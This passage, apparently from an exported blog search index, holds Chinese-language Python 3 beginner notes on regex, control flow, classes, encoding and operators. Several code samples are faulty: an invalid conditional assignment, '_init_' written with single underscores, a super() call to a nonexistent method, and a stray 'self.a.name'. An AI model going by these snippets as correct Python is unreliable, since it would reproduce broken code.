<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><table>
<thead>
<tr>
<th align="center">特殊字符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\A</td>
<td align="center">匹配字符串的起始</td>
</tr>
<tr>
<td align="center">\b</td>
<td align="center">匹配单词的开始或者结束</td>
</tr>
<tr>
<td align="center">\B</td>
<td align="center">匹配非单词的边界，既不是单词的开始或者结束</td>
</tr>
<tr>
<td align="center">\d</td>
<td align="center">匹配数字</td>
</tr>
<tr>
<td align="center">\D</td>
<td align="center">匹配非数字</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="center">匹配任意的空白符，比如空格，tab键</td>
</tr>
<tr>
<td align="center">\S</td>
<td align="center">匹配非空白</td>
</tr>
<tr>
<td align="center">\w</td>
<td align="center">匹配单词字符，比如字母或者数字或下划线或汉字</td>
</tr>
<tr>
<td align="center">\W</td>
<td align="center">匹配非单词字符</td>
</tr>
<tr>
<td align="center">\Z</td>
<td align="center">匹配单词的末尾</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">匹配url</span><br><span class="line"><span class="comment"># 正则的语法里面不能敲空格</span></span><br><span class="line">re.findall(<span class="string">&#x27;[a-zA-Z]&#123;4,5&#125;://\w*\.*\w+\.\w+&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;(https://|http://)(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;https://(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line"></span><br><span class="line">匹配邮箱</span><br><span class="line">re.findall(<span class="string">&#x27;.+@\w*\.*\w+&#x27;</span>,mail)</span><br><span class="line">re.findall(<span class="string">&#x27;.+@.+&#x27;</span>,mail)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-流程控制语句</title>
    <url>//f68e861f37cd.html</url>
    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>

<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>


<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>



<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-类与对象</title>
    <url>//06163ddbafa1.html</url>
    <content><![CDATA[<h2 id="对象-object"><a href="#对象-object" class="headerlink" title="对象(object)"></a>对象(object)</h2><p>对象是内存中专门存储数据的一块区域</p>
<p>对象中可以存储各种数据（比如：数字，布尔值，代码）</p>
<p>对象由三部分组成：对象的标识（id），对象的类型（type），对象的值（value）</p>
<p>1.标识用于唯一标识对象，通常对应于对象在计算机内存中的地址。使用内置函数<code>id(obj)</code>可返回对象obj的标识</p>
<p>2.类型用于表示对象存储的“数据”的类型。类型可以限制对象的取值范围以及可执行的操作。可以使用<code>type(obj)</code>获得对象的所属类型。</p>
<p>3.值表示对象所存储的数据的信息，使用<code>print(obj)</code>可以直接打印出值。</p>
<p>对象就是：一个内存块，拥有特定的值，支持特点类型的相关操作</p>
<h2 id="面向对象-oop"><a href="#面向对象-oop" class="headerlink" title="面向对象(oop)"></a>面向对象(oop)</h2><p>python是一门面向对象的编程语言</p>
<p>一切操作都是通过对象来进行的</p>
<p>通过将功能分解为一个个小步骤，用一个个步骤完成程序<br>把相关步骤保存在对象里面，想完成某个功能，直接找到相应对象<br>面向对象的编程语言，关注的是对象，而不是关注过程</p>
<p>面向对象的三大特征：</p>
<ul>
<li>封装：确保对象中的数据安全</li>
<li>继承：保证了对象的可扩展性</li>
<li>多态：保证了程序的灵活性</li>
</ul>
<h2 id="类-class"><a href="#类-class" class="headerlink" title="类(class)"></a>类(class)</h2><p>用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</p>
<ul>
<li>类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li>
<li>数据成员：类变量或者实例变量, 用于处理类及其实例对象的相关的数据。</li>
<li>方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</li>
<li>局部变量：定义在方法中的变量，只作用于当前实例的类。</li>
<li>实例变量：在类的声明中，属性是用变量来表示的。这种变量就称为实例变量，是在类声明的内部但是在类的其他成员方法之外声明的。</li>
<li>继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。</li>
<li>实例化：创建一个类的实例，类的具体对象。</li>
<li>方法：类中定义的函数。</li>
<li>对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li>
</ul>
<p>内置对象不能满足所有的要求，所以我们需要自定义一些对象<br>在程序中我们需要根据类创建对象，对象是类的实例</p>
<p>类就是一个用来创建对象的对象，类是type类型的对象</p>
<p>像 <code>int()</code>,<code>folat()</code>,<code>bool()</code>,<code>str()</code>,<code>list()</code>,<code>dict()</code>…都是类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	<span class="class"><span class="keyword">class</span> 类名(<span class="params">父类</span>):</span></span><br><span class="line">		代码块</span><br><span class="line">		<span class="comment"># 对象的初始化方法</span></span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">_init_</span>(<span class="params">self,...</span>):</span></span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		<span class="comment"># 其他的方法</span></span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">xxx</span>(<span class="params">self,...</span>):</span></span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 使用类创建一个对象，x是MyClass()的实例</span></span><br><span class="line">x = MyClass()</span><br><span class="line"><span class="comment"># 自定义的类推荐首字母大写</span></span><br><span class="line"><span class="comment"># 类是type类型的对象</span></span><br><span class="line"><span class="comment"># 没有父类括号可以省略</span></span><br><span class="line"><span class="comment"># 类的属性只能通过类对象修改，无法通过实例对象修改</span></span><br><span class="line"><span class="comment"># 在类中定义的变量，是所有实例的公共属性</span></span><br><span class="line"><span class="comment"># 在类中定义的函数，是类的方法，至少定义一个形参</span></span><br><span class="line"><span class="comment"># 第一个参数就是调用方法的对象本身</span></span><br><span class="line"><span class="comment"># 一般我们都会将这个参数命名为self（本身）</span></span><br><span class="line"><span class="comment"># 每次创建新的对象时，都会自动调用_init_()函数</span></span><br></pre></td></tr></table></figure>



<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>当我们调用一个对象的属性时，解析器会在当前对象中寻找是否含有该属性</p>
<p>如果没有，则去当前类的类对象中去寻找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">创建对象</span><br><span class="line">x = MyClass()</span><br><span class="line">调用方法</span><br><span class="line"><span class="comment"># 对象.方法名</span></span><br><span class="line"><span class="comment"># 方法调用会默认传递一个参数</span></span><br><span class="line">x.name = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line">对象的初始化</span><br><span class="line"><span class="comment"># 我们希望在创建对象时，必须设置name属性，不设置就无法创建，而且属性的创建应该是自动完成的</span></span><br><span class="line"><span class="comment"># 创建对象的流程</span></span><br><span class="line"><span class="comment">#	1.创建一个变量</span></span><br><span class="line"><span class="comment"># 	2.创建一个新对象</span></span><br><span class="line"><span class="comment"># 	3.__init__（self）方法执行</span></span><br><span class="line"><span class="comment"># 	4.将对象的id赋值给变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">	<span class="comment"># 在类中可以定义一些特殊方法（魔术方法）</span></span><br><span class="line">	<span class="comment"># 特殊方法都是以__开头，__结尾的方法</span></span><br><span class="line">	<span class="comment"># 特殊方法不需要我们自己调用</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">    	<span class="comment"># print(self)</span></span><br><span class="line">    	<span class="comment"># 通过self向新建的对象中初始化属性</span></span><br><span class="line">        self._name = name <span class="comment">#在实例中定义而不是在类中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say_hello</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大家好，我是%s&#x27;</span>%self.a.name)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># p1 = Person()</span></span><br><span class="line">p1 = Person(<span class="string">&#x27;孙悟空&#x27;</span>)</span><br><span class="line">p2 = Person(<span class="string">&#x27;猪八戒&#x27;</span>)</span><br><span class="line">p1.say_hello()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法：</span></span><br><span class="line"><span class="built_in">isinstance</span>() 用来检查一个对象是否是一个类的实例，也可以检查是否是一个父类的子类</span><br><span class="line">变量 = <span class="built_in">isinstance</span>(对象名,类名)</span><br><span class="line"><span class="built_in">issubclass</span>(子类，父类) 检查一个类是否是另一个类的子类</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">isinstance</span>(x,MyClass)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result=&quot;</span>,result)</span><br></pre></td></tr></table></figure>



<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装是面向对象的的三大特性之一</p>
<p>封装指的是隐藏对象中一些不希望被外部所访问的属性或者方法</p>
<p>在类的内部可以定义属性和方法，而在类的外部则可以直接调用属性或方法来操作数据，从而隐藏了类内部的复杂逻辑。</p>
<p>但是，Python并没有对属性和方法的访问权限进行限制。</p>
<p>为了保证类内部的某些属性或方法不被外部访问，可以在属性或方法名前面添加单下划线<code>_foo</code>、双下划线<code>__foo</code>或首尾加双下划线<code>__foo__</code>，从而限制访问权限。</p>
<p><code>_foo</code>：以单下划线开头的表示<code>protected</code>（保护）类型的成员，只允许类本身和字类进行访问，但不能使用 <code>from module import *</code>语句导入</p>
<p><code>__foo</code>：双下划线表示<code>private</code>（私有）类型的成员，只允许定义该方法的类本身进行访问，而且也不能通过类的实例访问，但是可以通过<code>类的实例名.类名__xxx</code>方式访问</p>
<p><code>__foo__</code>：首尾双下划线表示定义特殊方法，一般是系统定义名字，如<code>__init__</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">获取（修改）对象中的属性</span><br><span class="line"><span class="comment">#   - 需要提供一个getter和setter方法使外部可以访问到属性</span></span><br><span class="line"><span class="comment">#   - getter 获取对象中的指定属性（get_属性名）</span></span><br><span class="line"><span class="comment">#   - setter 用来设置对象的指定属性（set_属性名）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.hidden_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self.hidden_name = name</span><br><span class="line"></span><br><span class="line">p1 = MyClass()</span><br><span class="line">p1.set_name(<span class="string">&quot;孙悟空&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p1.get_name())</span><br><span class="line"></span><br><span class="line">隐藏属性</span><br><span class="line"><span class="comment"># 可以为对象的属性使用双下划线开头，__xxx</span></span><br><span class="line"><span class="comment"># 双下划线开头的属性，是对象的隐藏属性，隐藏属性只能在类的内部访问，无法通过对象访问</span></span><br><span class="line"><span class="comment"># 其实隐藏属性只不过是Python自动为属性改了一个名字</span></span><br><span class="line"><span class="comment"># 实际上是将名字修改为了，_类名__属性名 比如 __name -&gt; _Person__name</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用__开头的属性，实际上依然可以在外部访问，所以这种方式我们一般不用</span></span><br><span class="line"><span class="comment"># 一般我们会将一些私有属性（不希望被外部访问的属性）以_开头</span></span><br><span class="line"><span class="comment"># 一般情况下，使用_开头的属性都是私有属性，没有特殊需要不要修改私有属性</span></span><br></pre></td></tr></table></figure>



<h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>在Python中，可以通过<code>@property</code>（装饰器）将一个方法转换为属性，从而实现用于计算的属性。</p>
<p>将方法转换为属性后，可以直接通过方法名来访问方法，而不需要再添加一对小括号<code>()</code>，这样可以让代码更加简洁</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># property装饰器，用来将一个get方法，转换为对象的属性</span></span><br><span class="line">    <span class="comment"># 添加为property装饰器以后，我们就可以像调用属性一样使用get方法</span></span><br><span class="line">    <span class="comment"># 使用property装饰的方法，必须和属性名是一样的</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># setter方法的装饰器：@属性名.setter</span></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line">p1 = MyClass(<span class="string">&quot;猪八戒&quot;</span>,<span class="number">17</span>)</span><br><span class="line">p1.name = <span class="string">&quot;孙悟空&quot;</span></span><br><span class="line">p1.age = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(p1.name,p1.age)</span><br></pre></td></tr></table></figure>



<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承是面向对象的三大特性之一<br>在定义类时，可以在类名后的括号中指定当前类的父类<br>子类可以直接继承父类中的属性和方法<br>子类的实例也是父类的实例，即子类属于父类<br>如果省略父类，默认父类为object</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># super()可以获取当前类的父类来初始化父类中定义的属性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test1</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().test1(self)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;BBB&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 类名.__bases__ 这个属性可以用来获取当前类的所有父类</span></span><br><span class="line"><span class="built_in">print</span>(b.__bases__)</span><br><span class="line">c = b()</span><br><span class="line"><span class="built_in">print</span>(c.test())</span><br><span class="line"></span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">a</span>&#x27;&gt;,)</span></span><br><span class="line"><span class="class"><span class="title">AAA</span></span></span><br></pre></td></tr></table></figure>



<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>多态是面向对象的三大特征之一<br>一个对象可以以不同形态呈现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line">a = A(<span class="string">&#x27;孙悟空&#x27;</span>)</span><br><span class="line">b = B(<span class="string">&#x27;猪八戒&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_hello</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你好 %s&#x27;</span>%obj.name)</span><br><span class="line"></span><br><span class="line">say_hello(a)</span><br><span class="line">say_hello(b)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-编码</title>
    <url>//609542bd1343.html</url>
    <content><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>计算机在设计时采用8个比特（bit）作为一个字节（byte），<br>所以，一个字节能表示的最大的整数就是255（二进制11111111=十进制255），<br>如果要表示更大的整数，就必须用更多的字节</p>
<h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p>计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，<br>也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码</p>
<h3 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h3><p>为了更好的处理中文，不和ASCII冲突，中国制定了GB2312编码，用来把中文编进去</p>
<h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了<br>Unicode编码转化为“可变长编码”的UTF-8编码。<br>UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，<br>常用的英文字母被编码成1个字节，汉字通常是3个字节，<br>如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间</p>
<p>在计算机内存中，统一使用Unicode编码，保存或者传输的时候使用UTF-8编码<br>用记事本编辑的时候从文件读取的UTF-8字符被转换为Unicode字符到内存里，<br>编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件<br>对于单个字符的编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python提供了：</span><br><span class="line"><span class="built_in">ord</span>()函数获取字符的整数表示，<span class="built_in">chr</span>()函数把编码转换为对应的字符</span><br><span class="line"><span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="comment">#65</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">66</span>)	<span class="comment">#&#x27;B&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">25991</span>)	<span class="comment">#&#x27;文&#x27;</span></span><br><span class="line">如果知道字符的整数编码，还可以用十六进制这么写<span class="built_in">str</span></span><br><span class="line"><span class="string">&#x27;\u4e2d\u6587&#x27;</span>	<span class="comment"># &#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure>

<p>python中，字符串类型是str，在内存中以Unicode表示，一个字符对应若干字节<br>如果要保存或者传输，就需要把str变为以字节为单位的bytes</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;xxx&#x27;</span> <span class="comment">#用来表示bytes类型的数据</span></span><br><span class="line"></span><br><span class="line">以Unicode 表示的<span class="built_in">str</span>通过 encode()方法可以编码为指定的<span class="built_in">bytes</span></span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)	<span class="comment"># b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)	<span class="comment"># b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>

<p>反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是bytes。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">要把<span class="built_in">bytes</span>变为<span class="built_in">str</span>，就需要用decode()方法</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中文&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>个中文字符经过UTF-<span class="number">8</span>编码后通常会占用<span class="number">3</span>个字节，而<span class="number">1</span>个英文字符只占用<span class="number">1</span>个字节</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-运算符</title>
    <url>//b4c295df5c92.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h2 id="运算符-操作符"><a href="#运算符-操作符" class="headerlink" title="运算符(操作符)"></a>运算符(操作符)</h2><h3 id="运算符的分类"><a href="#运算符的分类" class="headerlink" title="运算符的分类"></a>运算符的分类</h3><h4 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1. 算术运算符"></a>1. 算术运算符</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center">加法运算符（如果是两个字符串之间进行加法运算，则会进行拼串操作）</td>
<td align="center">12 + 5 = 17</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">减法运算符</td>
<td align="center">12 - 5 = 7</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">乘法运算符（如果将字符串和数字相乘，将字符串重复指定次数）</td>
<td align="center">12 * 5 = 60</td>
</tr>
<tr>
<td align="center">/</td>
<td align="center">除法运算符，运算时结果总会返回一个浮点类型</td>
<td align="center">12 / 5 = 2.4</td>
</tr>
<tr>
<td align="center">//</td>
<td align="center">地板除，只会保留计算后的最小整数</td>
<td align="center">12 // 5 = 2</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">幂运算，求一个值的几次幂</td>
<td align="center">12 ** 5 = 248832</td>
</tr>
<tr>
<td align="center">%</td>
<td align="center">取模，求两个数相除的余数</td>
<td align="center">12 % 5 = 2</td>
</tr>
</tbody></table>
<h4 id="2-赋值运算符"><a href="#2-赋值运算符" class="headerlink" title="2. 赋值运算符"></a>2. 赋值运算符</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">=</td>
<td align="center">把右边的值赋值给左边</td>
<td align="center">x = 5 等同于 x =5</td>
</tr>
<tr>
<td align="center">+=</td>
<td align="center">加法赋值运算符</td>
<td align="center">x += 3  等同于 x = x + 3</td>
</tr>
<tr>
<td align="center">-=</td>
<td align="center">减法赋值运算符</td>
<td align="center">x -= 3  等同于 x = x - 3</td>
</tr>
<tr>
<td align="center">*=</td>
<td align="center">乘法赋值运算符</td>
<td align="center">x *= 3  等同于 x = x * 3</td>
</tr>
<tr>
<td align="center">/=</td>
<td align="center">除法赋值运算符</td>
<td align="center">x /= 3  等同于 x = x / 3</td>
</tr>
<tr>
<td align="center">%=</td>
<td align="center">取余赋值运算符</td>
<td align="center">x %= 3  等同于 x = x % 3</td>
</tr>
<tr>
<td align="center">//=</td>
<td align="center">地板除赋值运算符</td>
<td align="center">x //= 3 等同于 x = x // 3</td>
</tr>
<tr>
<td align="center">**=</td>
<td align="center">幂赋值运算符</td>
<td align="center">x *<em>= 3  等同于 x = x</em>* 3</td>
</tr>
<tr>
<td align="center">&amp;=</td>
<td align="center">与赋值运算符</td>
<td align="center">x &amp;= 3  等同于 x = x &amp; 3</td>
</tr>
<tr>
<td align="center">|=</td>
<td align="center">或赋值运算符</td>
<td align="center">x |= 3 等同于 x = x | 3</td>
</tr>
<tr>
<td align="center">^=</td>
<td align="center">异或赋值运算符</td>
<td align="center">x ^= 3  等同于 x = x ^ 3</td>
</tr>
<tr>
<td align="center">&gt;&gt;=</td>
<td align="center">右移动赋值运算符</td>
<td align="center">x &gt;&gt;= 3 等同于 x = x &gt;&gt; 3</td>
</tr>
<tr>
<td align="center">&lt;&lt;=</td>
<td align="center">左移动赋值运算符</td>
<td align="center">x &lt;&lt;= 3 等同于 x = x &lt;&lt; 3</td>
</tr>
<tr>
<td align="center">:=</td>
<td align="center">表达式内部变量赋值运算符</td>
<td align="center">if (age := 20) &gt; 18:      print(“已经成年了！”)</td>
</tr>
</tbody></table>
